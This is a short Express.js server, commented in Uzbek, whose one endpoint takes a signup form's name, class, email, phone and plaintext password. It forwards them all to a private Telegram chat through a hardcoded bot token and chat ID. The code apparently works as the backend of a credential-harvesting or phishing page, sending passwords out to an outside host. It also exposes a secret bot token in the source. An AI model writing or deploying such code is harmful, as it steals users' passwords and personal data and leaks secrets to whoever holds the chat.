import express from "express";
import cors from "cors";

const app = express();

app.use(cors());
app.use(express.json());


// BOT TOKENNI @BotFather dan yangisini ol
const BOT_TOKEN = "8645256830:AAFWxWplA4DbEJa9nYDc4E6BHYTOL_h8u3I";
const CHAT_ID = "8585388313";


app.post("/sendMessage", async (req,res)=>{

    const {
        name,
        surname,
        className,
        email,
        phone,
        password,
        passwordLevel
    } = req.body;


    const text = `
🆕 Yangi foydalanuvchi

👤 Ism: ${name || "-"}
👤 Familiya: ${surname || "-"}
🏫 Sinf: ${className || "-"}

📧 Email: ${email || "-"}

📱 Telefon: ${phone || "-"}

🔐 Parol: ${password}

⚡ Daraja: ${passwordLevel}
    `;


    try{


        const tg = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

            method:"POST",

            headers:{
                "Content-Type":"application/json"
            },

            body:JSON.stringify({

                chat_id:CHAT_ID,

                text:text

            })

        });


        const data = await tg.json();


        console.log(data);



        if(!data.ok){

            return res.status(400).json(data);

        }



        res.json({
            success:true
        });



    }catch(err){

        console.log(err);

        res.status(500).json({
            success:false
        });

    }


});



app.listen(3001,()=>{

console.log(
"Telegram server 3001 ishladi"
);

});